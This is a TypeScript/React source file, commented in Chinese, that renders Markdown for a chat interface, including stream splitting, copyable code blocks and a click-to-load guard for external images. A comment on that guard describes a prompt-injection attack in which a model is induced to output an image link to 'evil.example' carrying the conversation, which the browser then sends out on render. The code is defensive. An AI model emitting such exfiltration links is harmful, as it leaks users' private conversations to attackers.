"use client";

/**
 * Markdown 正文渲染（消息、流式回答、用户气泡共用）。
 *
 * 单独成模块是为了让它成为**懒加载分块**：react-markdown + remark-gfm + rehype-highlight
 * 带着 lowlight/highlight.js 的常用语言集，实测占首屏 JS 的 472KB（全部首屏 JS 1272KB），
 * 而 Hero 页（还没开会话）根本用不到它。ChatWindow 用 next/dynamic 引用本模块，
 * 首屏不再下载这 472KB；AppShell 在空闲时预取，真正打开会话时通常已经就绪。
 *
 * 流式输出版（v7）：
 * - 显示样式可配（见 lib/stream-settings）：平滑 / 打字机 / 渐显 / 即时，速度五档、可选打字光标；
 *   设置里改完下一帧生效，正在流的那条回答不用重开。
 * - 逐帧推进：把「已到达的完整文本」和「已显示的文本」分开，每帧只把显示进度往前推一小步，
 *   服务端 token 再来得快、再成串到达，界面也是匀速长出来的，不再一跳一跳。
 * - 增量切分 + 分块记忆化：「已稳定的完整块」按 key 记忆化，扫描进度也复用上一帧，
 *   每帧代价只与「新增的那几个字」成正比（旧版每帧重扫全文才是长回答的卡顿来源）。
 * - 代码围栏内的 tail 用纯文本渲染，等闭合后再交给 highlight.js 高亮一次，
 *   避免流式代码块每帧重新高亮。
 */
import { memo, useEffect, useRef, useState, useSyncExternalStore } from "react";
import ReactMarkdown from "react-markdown";
import rehypeHighlight from "rehype-highlight";
import remarkGfm from "remark-gfm";
import { IconCheckOutline14, IconCopyOutline16 } from "@/components/icons";
import { copyText } from "@/lib/clipboard";
import {
	getServerStreamSettings,
	getStreamSettings,
	nextRevealEnd,
	streamStepMs,
	subscribeStreamSettings,
	type StreamSettings,
} from "@/lib/stream-settings";
import { useI18n } from "@/i18n";

type MarkdownTextNode = { value?: unknown; children?: MarkdownTextNode[] };

function markdownNodeText(node: MarkdownTextNode | undefined): string {
	if (!node) return "";
	if (typeof node.value === "string") return node.value;
	return node.children?.map(markdownNodeText).join("") ?? "";
}

function CopyButton({ text }: { text: string }) {
	const [copied, setCopied] = useState(false);
	const [copyFailed, setCopyFailed] = useState(false);
	const { t } = useI18n();
	return (
		<>
			<button
				type="button"
				className="icon-btn"
				title={copyFailed ? t.copyFailed : t.copy}
				aria-label={t.copy}
				onClick={() => {
					void copyText(text).then((ok) => {
						setCopied(ok);
						setCopyFailed(!ok);
						setTimeout(() => { setCopied(false); setCopyFailed(false); }, 1200);
					});
				}}
			>
				{copied ? <IconCheckOutline14 size={14} /> : <IconCopyOutline16 size={14} />}
			</button>
			{copyFailed && <span role="alert" style={{ fontSize: 11, color: "var(--dsw-danger)" }}>{t.copyFailed}</span>}
		</>
	);
}

/** 同源图片可以直接显示；外部地址不行（见 SafeImage）。data: 早被 react-markdown 的默认 URL 过滤掉了 */
function isInlineImage(src: string): boolean {
	if (typeof window === "undefined") return false;
	try {
		return new URL(src, window.location.href).origin === window.location.origin;
	} catch {
		return false;
	}
}

/**
 * 外部图片默认不加载，点了才加载。
 * 模型输出可能被提示词注入（读到的网页、文件里藏着指令），让它写一张
 * `![](https://evil.example/?d=<会话内容>)`，浏览器一渲染就把内容发出去了 —— 不需要用户点任何东西。
 */
function SafeImage({ src, alt, title }: { src?: unknown; alt?: string; title?: string }) {
	const [allowed, setAllowed] = useState(false);
	const { t } = useI18n();
	const source = typeof src === "string" ? src : "";
	if (!source) return null;
	if (allowed || isInlineImage(source)) return <img src={source} alt={alt ?? ""} title={title} />;
	let host = source;
	try {
		host = new URL(source).host || source;
	} catch {
		/* 保留原样 */
	}
	return (
		<button type="button" className="btn-outline" style={{ height: 26, padding: "0 10px", fontSize: 12 }} title={source} onClick={() => setAllowed(true)}>
			{t.externalImage}{alt ? `：${alt}` : ""}（{host}）
		</button>
	);
}

/**
 * 只有 Markdown 内容、没有 .md 外层容器的纯内容组件。
 * 流式分块时，多个块共用同一个 .md 容器（外边距规则因此照旧生效），
 * 每块各自记忆化：只要 text 没变就不会重新解析。
 */
const MarkdownContent = memo(function MarkdownContent({ text }: { text: string }) {
	return (
		<ReactMarkdown
			remarkPlugins={[remarkGfm]}
			rehypePlugins={[[rehypeHighlight, { detect: false, ignoreMissing: true }]]}
			components={{
				a: ({ node: _node, ...props }) => <a {...props} target="_blank" rel="noopener noreferrer" />,
				img: ({ src, alt, title }) => <SafeImage src={src} alt={alt} title={title} />,
				pre: ({ node, children, ...props }) => (
					<div className="md-code-block">
						<div className="md-code-copy"><CopyButton text={markdownNodeText(node)} /></div>
						<pre {...props}>{children}</pre>
					</div>
				),
			}}
		>
			{text}
		</ReactMarkdown>
	);
});

export const MarkdownBlock = memo(function MarkdownBlock({ text }: { text: string }) {
	return (
		<div className="md">
			<MarkdownContent text={text} />
		</div>
	);
});

// ---------- 流式渲染 ----------

/** 列表项（含有序列表）；用于避免在松散列表内部的空行处切块 */
const LIST_ITEM_RE = /^ {0,3}(?:[-*+]|\d+[.)])\s/;
const FENCE_RE = /^ {0,3}(`{3,}|~{3,})/;

export interface StreamingSplit {
	/** 已稳定的完整块：文本不再变，各自记忆化，不会跟着尾巴一起重新解析 */
	blocks: string[];
	/** 正在生成的尾巴 */
	tail: string;
	/** 尾巴是否落在未闭合的代码围栏里 */
	tailInFence: boolean;
}

/**
 * 增量切分器：流式文本只会往后长，已经扫过的行不可能再改变判定，所以只扫新增的行。
 * 每帧代价与「新增文本」成正比，长回答不会随长度增长而越来越卡（旧版每帧重扫全文）。
 *
 * 切分规则：
 * - 只在代码围栏之外的空行处切：空行是天然的块边界，两侧各自都是完整可解析的 Markdown；
 * - 空行前后都是列表项（松散列表）时不切，保持有序列表序号连续；
 * - 半行（还没换行符）不急着判：半行 "2." 看着不像列表项，写完 "2. 乙" 才是，判早了会
 *   把松散列表切开、序号重排。只有「再长也不会改变判定」时才就地判，否则等下一行写完。
 */
export function createStreamingSplitter(): { update: (text: string) => StreamingSplit } {
	let prevText = "";
	let scanPos = 0;
	let inFence = false;
	let fenceChar = "";
	let segStart = 0;
	let prevNonEmpty = "";
	let blocks: string[] = [];

	const reset = () => {
		prevText = "";
		scanPos = 0;
		inFence = false;
		fenceChar = "";
		segStart = 0;
		prevNonEmpty = "";
		blocks = [];
	};

	return {
		update(text: string): StreamingSplit {
			// 被整体替换（编辑重发、切会话）时重头扫；正常流式是前缀延长
			if (!text.startsWith(prevText)) reset();
			prevText = text;
			while (scanPos < text.length) {
				const nl = text.indexOf("\n", scanPos);
				// 半行不判：等换行到了再判（围栏行、空行边界都可能被这半行改变）
				if (nl === -1) break;
				const line = text.slice(scanPos, nl);
				const fence = FENCE_RE.exec(line);
				if (fence) {
					const ch = fence[1][0];
					if (!inFence) {
						inFence = true;
						fenceChar = ch;
					} else if (ch === fenceChar) {
						inFence = false;
					}
				}
				if (!inFence && line.trim() === "") {
					const nextStart = nl + 1;
					const nextNl = text.indexOf("\n", nextStart);
					const nextLine = text.slice(nextStart, nextNl === -1 ? text.length : nextNl);
					// 下一行是否已经写完，或者「再长也不会改变判定」（非空且前一段不是列表项）
					const decidable =
						nextNl !== -1 ||
						(nextStart < text.length && nextLine.trim() !== "" && !LIST_ITEM_RE.test(prevNonEmpty));
					if (!decidable) break; // scanPos 留在空行处，等下一行写完再判
					const looseList = LIST_ITEM_RE.test(prevNonEmpty) && LIST_ITEM_RE.test(nextLine);
					if (!looseList && nextLine.trim() !== "") {
						const seg = text.slice(segStart, nextStart);
						if (seg.trim()) blocks.push(seg);
						segStart = nextStart;
					}
				}
				if (line.trim() !== "") prevNonEmpty = line;
				scanPos = nl + 1;
			}
			return { blocks: blocks.slice(), tail: text.slice(segStart), tailInFence: inFence };
		},
	};
}

/** 一次性切分（冷启动 / 测试用）；流式循环里请复用 createStreamingSplitter 的扫描进度 */
export function splitStreamingMarkdown(text: string): StreamingSplit {
	return createStreamingSplitter().update(text);
}

/** 流式偏好：设置面板一改，这里立刻换样式（正在流的那条回答不用重开） */
function useStreamSettings(): StreamSettings {
	return useSyncExternalStore(subscribeStreamSettings, getStreamSettings, getServerStreamSettings);
}

interface StreamView extends StreamingSplit {
	/** 当前显示出来的部分（始终是目标文本的前缀） */
	shown: string;
}

export const StreamingMarkdownBlock = memo(function StreamingMarkdownBlock({ text }: { text: string }) {
	const settings = useStreamSettings();
	const splitterRef = useRef<{ update: (text: string) => StreamingSplit } | null>(null);
	if (!splitterRef.current) splitterRef.current = createStreamingSplitter();
	const [view, setView] = useState<StreamView>(() => ({ shown: text, ...splitterRef.current!.update(text) }));
	const viewRef = useRef(view);
	const targetRef = useRef(text);
	const settingsRef = useRef(settings);
	const timerRef = useRef<ReturnType<typeof setTimeout> | null>(null);

	const commit = (shown: string) => {
		const next: StreamView = { shown, ...splitterRef.current!.update(shown) };
		viewRef.current = next;
		setView(next);
	};

	const stopTimer = () => {
		if (timerRef.current !== null) clearTimeout(timerRef.current);
		timerRef.current = null;
	};

	/** 一帧：只把显示进度往前推一点。用 setTimeout 而非 rAF：后台标签页 / 测试环境同样确定。 */
	const step = () => {
		timerRef.current = null;
		const target = targetRef.current;
		const shown = viewRef.current.shown;
		if (shown === target) return; // 追平，收工（下次文本变化再启动）
		if (!target.startsWith(shown)) {
			commit(target); // 目标被整体替换（编辑重发）：直接跟上，不再逐帧
			return;
		}
		const current = settingsRef.current;
		commit(target.slice(0, nextRevealEnd(target, shown.length, current)));
		timerRef.current = setTimeout(step, streamStepMs(current.speed));
	};

	/** 起节拍（已经在跑就不动）；「即时」不排队，直接追平 */
	const start = () => {
		if (timerRef.current !== null) return;
		const current = settingsRef.current;
		if (current.style === "instant") {
			if (viewRef.current.shown !== targetRef.current) commit(targetRef.current);
			return;
		}
		timerRef.current = setTimeout(step, streamStepMs(current.speed));
	};

	// 目标变化：更新目标，节拍没在跑就起一个。已有节拍时不重置计时器（防抖会让正文冻住）
	useEffect(() => {
		targetRef.current = text;
		if (text !== viewRef.current.shown) start();
	}, [text]);

	// 偏好变化即时生效：切成「即时」就停表追平，切回别的样式就继续起节拍
	useEffect(() => {
		settingsRef.current = settings;
		if (viewRef.current.shown === targetRef.current) return;
		if (settings.style === "instant") {
			stopTimer();
			commit(targetRef.current);
			return;
		}
		start();
	}, [settings]);

	useEffect(() => () => stopTimer(), []);

	const { shown, blocks, tail, tailInFence } = view;
	const tailNode = tailInFence
		// 围栏还没闭合：纯文本顶着，等闭合后作为稳定块交给 highlight.js 高亮一次
		? <pre className="pw-stream-code">{tail}</pre>
		: <MarkdownContent text={tail} />;

	return (
		<div
			className={settings.caret ? "md pw-stream pw-stream-caret" : "md pw-stream"}
			data-stream-style={settings.style}
			data-stream-pending={shown === text ? undefined : ""}
		>
			{blocks.map((block, i) => <MarkdownContent key={i} text={block} />)}
			{tail
				? settings.caret
					// 光标由 CSS 挂在尾巴最后一个元素的行内末尾（不会另起一行）
					? <div className="pw-stream-tail">{tailNode}</div>
					: tailNode
				: null}
		</div>
	);
});

export default MarkdownBlock;
